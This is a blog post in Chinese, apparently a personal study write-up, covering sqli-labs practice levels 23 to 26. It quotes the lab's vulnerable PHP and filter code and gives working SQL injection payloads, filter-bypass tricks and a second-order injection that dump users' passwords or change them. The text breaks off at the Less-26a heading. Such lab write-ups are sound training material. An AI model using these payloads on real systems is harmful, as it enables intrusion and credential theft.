@@ -1,0 +1,676 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>sqli-labs靶场(4)绕过 - Sc0fie1d</title><meta name="Description" content="scofield&#39;s blog"><meta property="og:title" content="sqli-labs靶场(4)绕过" />
+<meta property="og:description" content="sqli-labs靶场精简记录23-31" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://scofield1920.github.io/sqli-labs_4_bypass/" /><meta property="og:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-11-17T00:12:00+08:00" />
+<meta property="article:modified_time" content="2023-11-17T00:12:00+08:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico" /><meta name="twitter:title" content="sqli-labs靶场(4)绕过"/>
+<meta name="twitter:description" content="sqli-labs靶场精简记录23-31"/>
+<meta name="application-name" content="scofield-blog">
+<meta name="apple-mobile-web-app-title" content="scofield-blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://scofield-1313710994.cos.ap-beijing.myqcloud.com/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="http://scofield1920.github.io/sqli-labs_4_bypass/" /><link rel="prev" href="http://scofield1920.github.io/sqli-labs_5_wchar/" /><link rel="next" href="http://scofield1920.github.io/sqli-labs_3_post_head/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="MQ8DNu27ayX6B_4ObiEDK09vGr1fdy7kOAnbd09hJk4" /><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "sqli-labs靶场(4)绕过",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/scofield1920.github.io\/sqli-labs_4_bypass\/"
+        },"image": ["http:\/\/scofield1920.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "web, wp, sqli","wordcount":  685 ,
+        "url": "http:\/\/scofield1920.github.io\/sqli-labs_4_bypass\/","datePublished": "2023-11-17T00:12:00+08:00","dateModified": "2023-11-17T00:12:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "http:\/\/scofield1920.github.io\/images\/avatar.webp",
+                    "width":  528 ,
+                    "height":  560 
+                }},"author": {
+                "@type": "Person",
+                "name": "Sc0fie1d"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="desktop-header-typeit" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/links/"> Links </a><a class="menu-item" href="/about/"> About </a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="Switch Theme">
+                        <option value="light">Light</option>
+                        <option value="dark">Dark</option>
+                        <option value="black">Black</option>
+                        <option value="auto">Auto</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Sc0fie1d"><span class="header-title-pre"><i class='far fa-edit fa-fw'></i></span><span id="mobile-header-typeit" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/links/" title="">Links</a><a class="menu-item" href="/about/" title="">About</a><a class="menu-item" href="https://github.com/scofield1920" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="Switch Theme">
+                    <option value="light">Light</option>
+                    <option value="dark">Dark</option>
+                    <option value="black">Black</option>
+                    <option value="auto">Auto</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-23-get---error-based---strip-comments">Less-23 GET - Error based - strip comments</a></li>
+        <li><a href="#less---24-second-degree-injections-real-treat--store-injections">Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections</a></li>
+        <li><a href="#less-25-trick-with-or--and">Less-25 Trick with OR &amp; AND</a></li>
+        <li><a href="#less-25a-trick-with-or--and-blind">Less-25a Trick with OR &amp; AND Blind</a></li>
+        <li><a href="#less-26-trick-with-comments-and-space">Less-26 Trick with comments and space</a></li>
+        <li><a href="#less-26a-get---blind-based---all-your-spaces-and-comments-belong-to-us">less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us</a></li>
+        <li><a href="#less-27-get---error-based--all-your-union--select-belong-to-us">less 27 GET - Error Based- All your UNION &amp; SELECT belong to us</a></li>
+        <li><a href="#less-27a-get---blind-based--all-your-union--select-belong-to-us">less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</a></li>
+        <li><a href="#less-28-get---error-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis">less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis</a></li>
+        <li><a href="#less-28a-get---bind-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis">less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis</a></li>
+        <li><a href="#less-29-get--error-based--impidence-mismatch--having-a-waf-in-front-of-web-application">Less-29 GET -Error based- IMPIDENCE MISMATCH- Having a WAF in front of web application.</a></li>
+        <li><a href="#less-30-get-blind-havaing-with-waf">Less-30 Get-Blind Havaing with WAF</a></li>
+        <li><a href="#less-31-protection-with-waf">Less-31 Protection with WAF</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">sqli-labs靶场(4)绕过</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="/" title="Author" rel=" author" class="author">Sc0fie1d</a>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/categories/web/"><i class="far fa-folder fa-fw"></i>Web</a>&nbsp;<a href="/categories/wp/"><i class="far fa-folder fa-fw"></i>Wp</a>&nbsp;<a href="/categories/sqli-labs/"><i class="far fa-folder fa-fw"></i>Sqli-Labs</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-11-17">2023-11-17</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;685 words&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#less-23-get---error-based---strip-comments">Less-23 GET - Error based - strip comments</a></li>
+        <li><a href="#less---24-second-degree-injections-real-treat--store-injections">Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections</a></li>
+        <li><a href="#less-25-trick-with-or--and">Less-25 Trick with OR &amp; AND</a></li>
+        <li><a href="#less-25a-trick-with-or--and-blind">Less-25a Trick with OR &amp; AND Blind</a></li>
+        <li><a href="#less-26-trick-with-comments-and-space">Less-26 Trick with comments and space</a></li>
+        <li><a href="#less-26a-get---blind-based---all-your-spaces-and-comments-belong-to-us">less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us</a></li>
+        <li><a href="#less-27-get---error-based--all-your-union--select-belong-to-us">less 27 GET - Error Based- All your UNION &amp; SELECT belong to us</a></li>
+        <li><a href="#less-27a-get---blind-based--all-your-union--select-belong-to-us">less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</a></li>
+        <li><a href="#less-28-get---error-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis">less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis</a></li>
+        <li><a href="#less-28a-get---bind-based--all-your-union--select-belong-to-us-string-single-quote-with-parenthesis">less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis</a></li>
+        <li><a href="#less-29-get--error-based--impidence-mismatch--having-a-waf-in-front-of-web-application">Less-29 GET -Error based- IMPIDENCE MISMATCH- Having a WAF in front of web application.</a></li>
+        <li><a href="#less-30-get-blind-havaing-with-waf">Less-30 Get-Blind Havaing with WAF</a></li>
+        <li><a href="#less-31-protection-with-waf">Less-31 Protection with WAF</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>sqli-labs靶场精简记录23-31</p>
+<h3 id="less-23-get---error-based---strip-comments" class="headerLink">
+    <a href="#less-23-get---error-based---strip-comments" class="header-mark"></a>Less-23 GET - Error based - strip comments</h3><p>基于错误的，过滤注释的GET型</p>
+<p>注释符号被过滤了</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; or &#39;1&#39;=&#39;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; ),3 or &#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">?id=-1&#39; union select 1,(select group_concat(password,username) from users),3 or &#39;1&#39;=&#39;1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less---24-second-degree-injections-real-treat--store-injections" class="headerLink">
+    <a href="#less---24-second-degree-injections-real-treat--store-injections" class="header-mark"></a>Less - 24 Second Degree Injections <em>Real treat</em> -Store Injections</h3><p>二次注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">#login.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">function</span> <span class="nf">sqllogin</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="nv">$username</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_user&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">   <span class="nv">$password</span> <span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;login_password&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">   <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">      <span class="nv">$res</span> <span class="o">=</span> <span class="nx">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You tried to be real smart, Try harder!!!! :( &#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl">      
+</span></span><span class="line"><span class="cl"><span class="c1">#pass_change.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$username</span><span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$curr_pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;current_password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$re_pass</span><span class="o">=</span> <span class="nx">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;re_password&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$pass</span><span class="o">==</span><span class="nv">$re_pass</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">{</span>	
+</span></span><span class="line"><span class="cl">		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET PASSWORD=&#39;</span><span class="si">$pass</span><span class="s2">&#39; where username=&#39;</span><span class="si">$username</span><span class="s2">&#39; and password=&#39;</span><span class="si">$curr_pass</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义了</p>
+<p>在修改用户名这里，从 session 中直接获得了用户名，并且直接用于更新语句并未做检查，从根本上来说，插入数据时没有做过滤，只是做了转义处理</p>
+<p>也就是说当前用户中如果含有注释，便可以更改当前用户名中包含的另一用户的密码，例如注册用户<code>Dumb’– +</code> 那么他就可以更改 <code>Dumb</code> 的密码</p>
+<h3 id="less-25-trick-with-or--and" class="headerLink">
+    <a href="#less-25-trick-with-or--and" class="header-mark"></a>Less-25 Trick with OR &amp; AND</h3><p>过滤了or和and</p>
+<p>waf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">blacklist</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/or/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>			<span class="c1">//strip out OR (non case sensitive)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/AND/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//Strip out AND (non case sensitive)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>过滤的方式是替换为空</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">双写绕过		oorr
+</span></span><span class="line"><span class="cl">大小写变形绕过  	or=Or=oR=OR
+</span></span><span class="line"><span class="cl">利用运算符		or=||  and=&amp;&amp;
+</span></span><span class="line"><span class="cl">url编码绕过		#=%23,hex编码 ~=0x7e
+</span></span><span class="line"><span class="cl">添加注释		/*or*/
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-25a-trick-with-or--and-blind" class="headerLink">
+    <a href="#less-25a-trick-with-or--and-blind" class="header-mark"></a>Less-25a Trick with OR &amp; AND Blind</h3><p>过滤了or和and的盲注</p>
+<p>可以用脚本 Bool 或 Time 盲注</p>
+<h3 id="less-26-trick-with-comments-and-space" class="headerLink">
+    <a href="#less-26-trick-with-comments-and-space" class="header-mark"></a>Less-26 Trick with comments and space</h3><p>过滤了注释和空格的注入</p>
+<p>waf</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">blacklist</span><span class="p">(</span><span class="nv">$id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/or/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>			<span class="c1">//strip out OR (non case sensitive)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/and/i&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//Strip out AND (non case sensitive)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\*]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//strip out /*
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[--]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//Strip out --
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[#]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>			<span class="c1">//Strip out #
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\s]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//Strip out spaces
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nv">$id</span><span class="o">=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[\/\\\\]/&#39;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$id</span><span class="p">);</span>		<span class="c1">//Strip out slashes
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="nv">$id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不仅过滤了or 与 and, 还过滤了单行注释&ndash;与#,以及多行注释 /**/,还过滤了空格，以及正反斜杠 /</p>
+<p>注释符号bypass：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">构造&#39;来闭合后面的&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>空格bypass：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">%09 	TAB水平
+</span></span><span class="line"><span class="cl">%0a 	新建一行
+</span></span><span class="line"><span class="cl">%0c		新建一页
+</span></span><span class="line"><span class="cl">%0d		return功能
+</span></span><span class="line"><span class="cl">%0b		TAB(垂直)
+</span></span><span class="line"><span class="cl">%a0		空格
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#报错注入
+</span></span><span class="line"><span class="cl">爆数据库:
+</span></span><span class="line"><span class="cl">&#39;||updatexml(1,concat(&#39;$&#39;,(database())),0)||&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">爆表:
+</span></span><span class="line"><span class="cl">&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">爆字段:
+</span></span><span class="line"><span class="cl">&#39;||updatexml(1,concat(&#39;$&#39;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=&#39;security&#39;)%26%26(table_name=&#39;users&#39;))),0)||&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">爆数据:
+</span></span><span class="line"><span class="cl">&#39;||updatexml(1,concat(&#39;$&#39;,(select(concat(&#39;$&#39;,id,&#39;$&#39;,username,&#39;$&#39;,passwoorrd))from(users)limit%0b0,1)),0)||&#39;1&#39;=&#39;1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#布尔盲注
+</span></span><span class="line"><span class="cl">1&#39;%26%26(ascii(mid((select(group_concat(schema_name))from(infoorrmation_schema.schemata)),1,1))&gt;65)||&#39;1&#39;=&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-26a-get---blind-based---all-your-spaces-and-comments-belong-to-us" class="headerLink">
